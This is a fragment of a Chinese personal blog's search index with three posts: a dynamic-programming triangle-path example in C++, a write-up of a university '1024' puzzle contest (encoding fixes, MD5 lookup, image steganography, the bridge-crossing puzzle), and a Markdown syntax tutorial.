    <content><![CDATA[<p> dp(动态规划)的基本例题，可以浅浅的帮助理解。</p>
<span id="more"></span>
<h4 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h4><p>先来看一道很简单的例题：</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/13a8cadd91043149.png" alt=""></p>
<p>具体要求如下：</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/fc137aba01164ed2.png" alt=""></p>
<p>根据格式可以推出状态方程，这个方程不难，主要关注dp思想，找到状态方程，此题不难发现每一个数字只能往下或者往右走，因此每一个位置的最大值就等于其上面或上左位置的最大值，找到每一个数的最大值，这基本就是动态规划的思想。</p>
<p>核心代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ac代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> number[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;number[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dpcount</span>();</span><br><span class="line">	cout&lt;&lt;ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>算法</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>记录软院2022年1024解谜</title>
    <url>/2022/11/08/%E8%AE%B0%E5%BD%95%E8%BD%AF%E9%99%A22022%E5%B9%B41024%E8%A7%A3%E8%B0%9C/</url>
    <content><![CDATA[<p> 首先是为什么写这篇文章，emmm，就当作是打了一次ctf写的wp吧，写都写了不如就发了(雾</p>
<p>再讲一下这次1024的情况，我是在总共15题中做出9题，排名在12位，当然其中也有廖学长的提示(雾</p>
<h4 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h4><p>第一题就不说了，兜兜转转搞半天原来就是直接点击链接进入拿到flag{hello1024}，害得我想了半天。</p>
<p>第二题题面就很简单，经典的乱码，一眼看出文本编码问题，常见的编码出现乱码原因就是utf-8编码和gbk编码的问题，这里有一个简单的办法就是打开一个编辑器修改编码方式即可，由于正文肯定是使用utf-8编写，因此只需要在gbk编码下将内容录入编辑器再重新以utf-8打开文件即可。</p>
<p>密文：鑷 劧鏁扮殑鍊硷紝淇濈暀灏忔暟鐐瑰悗 62 浣嶏紝涓嶇渷鐣ュ皬鏁扮偣</p>
<p><img src="https://s2.loli.net/2022/11/09/WSFKalPjJif97Vc.png" alt="image1.png"></p>
<p>得到正文，但是不全，这个时候就靠脑洞了……我当时还以为转错了…….（逆天出题人，求一个什么什么数的小数点后62位的值，62位，基本肯定无限不循环小数，尝试${\Pi}$ 和自然对数e, 结果就是求e的小数点后64位。  </p>
<h4 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h4><p>题面：画家的密码</p>
<p>题目：$a_1=1210a_2=321100a_3=?$</p>
<p>也很简单，可是脑洞开的不够大了..（哭，结束之后才知道是自我描述数，反正当时是没想到….</p>
<h4 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h4><p>解码问题，明文被加密，给出密文：627c279d7f747d9a8d2418c0f88b0960</p>
<p>根据廖学长提醒，所有的md5加密的密文是具备固定长度的，因此看到该密文优先选择md5加密，随后找在线工具解就行，可是这题好像又有些网站解不出来，这里贴一个可以解的：<a href="https://www.t007.cn/">https://www.t007.cn/</a> 。其实网站倒是很多，多换几个就能解出来。</p>
<h4 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h4><p>题面依然是简单至极：</p>
<p><img src="https://s2.loli.net/2022/11/09/vM1I53uLPjr7JA2.png" alt="image2.png"></p>
<p>搞得还以为是查看网页源代码，结果只要改一改google的黑夜模式就可以找到一串白色的文字……脑洞….</p>
<h4 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a>第十题</h4><p>简单的图片隐写，先binwalk查看有没有隐藏的文件可以分离：</p>
<p><img src="https://s2.loli.net/2022/11/09/yrxMLdfYcSqB35H.png" alt="image3.png"></p>
<p>发现藏有一个zip，分离出来的文件是一个名字为flag的文件，但是常规方法打不开，这里我是用的ida打开，查找字符串就能找到flag,<img src="https://s2.loli.net/2022/11/09/iGOY5me6NXJp2gy.png" alt="image4.png"></p>
<p>但是后来发现根本没必要，直接记事本打开，查找关键字flag或者关键符号”{}”即可找到flag，然后一眼字符串以==结尾，base64解码即可。</p>
<h4 id="第十一题"><a href="#第十一题" class="headerlink" title="第十一题"></a>第十一题</h4><p>翻译一下得知要求最长公共子序列，直接网上搜一个代码跑一遍就行，答案不唯一选一个就好</p>
<h4 id="第十三题"><a href="#第十三题" class="headerlink" title="第十三题"></a>第十三题</h4><p>题目：A,B,C,D  4个人组成的考古小队，在峡谷洞穴中触发陷阱，释放了僵尸，他们当即原路返回，可原路有条横跨峡谷的索桥。天色昏暗，只有一只灯，且如果有人要过桥，必须要提着灯过桥，桥上不可同时存在大于两个人的数量，或者当一群僵尸与人同时上桥时，桥便会断掉。 现在已知A过桥需要1min B:2min C:5min D:10min 而他们已经计算出僵尸群还有17min将赶上他们。怎么做才能安全脱险呢？请输出正确过程 (t代表灯，注意为规范答案，t放在表示人的字母的后面 请参照示例 示例过程：“CBt Bt BAt” 代表“C与B一起过桥，他们拿着灯，（空格后面到下一个空格）代表返回过程：B带着灯回来，然后BAt指的是B跟A拿着灯过桥”)</p>
<p>答案：ABt At CDt Bt ABt</p>
<h4 id="第十四题"><a href="#第十四题" class="headerlink" title="第十四题"></a>第十四题</h4><p>图片隐写，由于给出了两个一样的图片，尝试stegsolve和盲水印解题，盲水印的话跑一个小脚本就行，得到一个名为out.png的图片，内容是一个篮球，上面有个100，就是答案，看得不清楚可以去stegsolve自己看看，脚本内容比较长，就不在这里放了。想要的可以网上搜一搜，很多的，<del>或者联系我捏</del>。</p>
<p><img src="https://s2.loli.net/2022/11/09/C7qPRu4XeIMSj5V.png" alt="image5.png"></p>
<h4 id="第十五题"><a href="#第十五题" class="headerlink" title="第十五题"></a>第十五题</h4><p>梅开二度，盲水印x2得到答案。</p>
<p>结束！下班！来自一个啥也没干却很累的菜狗的碎碎念……</p>
]]></content>
      <categories>
        <category>做题&amp;活动&amp;比赛の记录</category>
      </categories>
      <tags>
        <tag>1024</tag>
        <tag>图片隐写</tag>
        <tag>逆天出题人</tag>
      </tags>
  </entry>
  <entry>
    <title>markdown基本语法使用</title>
    <url>/2022/06/15/%E8%BF%99%E6%98%AF%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p> 这里是第一篇博客，不知道写些啥，那就浅浅的写一下markdown的基本语法叭</p>
<span id="more"></span>
<h1 id="1-粗体和斜体"><a href="#1-粗体和斜体" class="headerlink" title="1.粗体和斜体"></a>1.粗体和斜体</h1><h1 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.*斜体* or _斜体_</span><br><span class="line">2.**粗体**</span><br><span class="line">3.***加粗斜体***</span><br><span class="line">4.~~删除线~~</span><br></pre></td></tr></table></figure>
<p>显示效果：</p>
<ol>
<li><em>这是一段斜体</em></li>
<li><strong>这是一段粗体</strong></li>
<li><strong><em>这是一段加粗斜体</em></strong></li>
<li><del>这是一段删除线</del></li>
</ol>
<h1 id="2-分级标题"><a href="#2-分级标题" class="headerlink" title="2.分级标题"></a>2.分级标题</h1><p>语法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.#一级标题</span><br><span class="line">2.##二级标题</span><br><span class="line">3.###三级标题</span><br><span class="line">4.####四级标题</span><br><span class="line">5.#####五级标题</span><br><span class="line">6.######六级标题</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong> 字号一次递减，一级最大。</p>
<h1 id="3-超链接"><a href="#3-超链接" class="headerlink" title="3.超链接"></a>3.超链接</h1><h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><p>语法说明：[]里写链接文字，()里写链接地址，另外最后的双引号内属性表示鼠标悬停时给出的信息，可加可不加，要加的话记得补上空格。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.欢迎滚去[百度一下](https://www.baidu.com/ &quot;百度一下你就知道&quot;)</span><br><span class="line">2.欢迎滚去[百度一下](https://www.baidu.com/)</span><br></pre></td></tr></table></figure>
<p>1.欢迎滚去<a href="https://www.baidu.com/" title="百度一下你就知道">百度一下</a></p>
<p>2.欢迎滚去<a href="https://www.baidu.com/">百度一下</a></p>
<h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><p>在第一种的基础上可以加上序号方便管理。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.你可以前往[百度][1],[洛谷][2]等地方学习</span><br><span class="line">2.[1]:https://www.baidu.com/ &quot;百度&quot;</span><br><span class="line">3.[2]:https://www.luogu.com.cn/ &quot;洛谷&quot;</span><br></pre></td></tr></table></figure>
<p>你可以前往<a href="https://www.baidu.com/" title="百度">百度</a>,<a href="https://www.luogu.com.cn/" title="洛谷">洛谷</a>等地方学习</p>
<h4 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h4><p>这种是直接贴出来的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;链接地址&gt;</span><br></pre></td></tr></table></figure>
<p><a href="https://www.baidu.com/">https://www.baidu.com/</a></p>
<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p><strong>无序列表的表示</strong></p>
<p>使用*，+，- 表示无序列表</p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.- 无序列表一</span><br><span class="line">2.- 无序列表二</span><br><span class="line">3.- 无序列表三</span><br></pre></td></tr></table></figure>
<p>显示效果：</p>
<ul>
<li>无序列表一</li>
<li>无序列表二</li>
<li>无序列表三</li>
</ul>
<p><strong>有序列表的表示</strong></p>
<p>直接用一个数字和英文句点就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. balabala</span><br><span class="line">2. balabala</span><br><span class="line">3. balabala</span><br></pre></td></tr></table></figure>
<p>显示效果：</p>
<ol>
<li>有序列表一</li>
<li>有序列表二</li>
<li>有序列表三</li>
</ol>
<h5 id="包含引用（虽然我感觉没啥用2333）"><a href="#包含引用（虽然我感觉没啥用2333）" class="headerlink" title="包含引用（虽然我感觉没啥用2333）"></a>包含引用（虽然我感觉没啥用2333）</h5><p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 阅读的方法</span><br><span class="line">	&gt; 打开电灯</span><br><span class="line">	&gt; 打开书本</span><br></pre></td></tr></table></figure>
<p>效果：</p>
<ul>
<li><p>阅读的方法</p>
<blockquote>
<p>打开电灯<br>打开书本</p>
</blockquote>
</li>
</ul>
<h5 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.1986\. what a  great season.(正确)</span><br><span class="line">2.1986. what a  great season.(错误)</span><br></pre></td></tr></table></figure>
<p>emmm,自己注意一下</p>
<ol>
<li>1986. what a  great season.</li>
</ol>
<h1 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h1><p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">质能守恒方程可以用$E=mc^2$来表达</span><br></pre></td></tr></table></figure>
<p>效果：$E=mc^2$</p>
<p>数学符号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尖括号:\langle</span><br><span class="line">上取整:\lceil</span><br><span class="line">下取整:\lfloor</span><br><span class="line">分数:\frac&#123;分子&#125;&#123;分母&#125;</span><br><span class="line">求和:\sum</span><br><span class="line">积分:\int_&#123;下限&#125;^&#123;\infty&#125;后面的括号表示上限，\infty表示无限</span><br><span class="line">极限:\lim_&#123;x\to+\infty&#125;</span><br></pre></td></tr></table></figure>
<p>极限的效果：$\lim_{x\to +\infty}$</p>
]]></content>
      <categories>
        <category>语言语法</category>
      </categories>
      <tags>
        <tag>语法</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
</search>
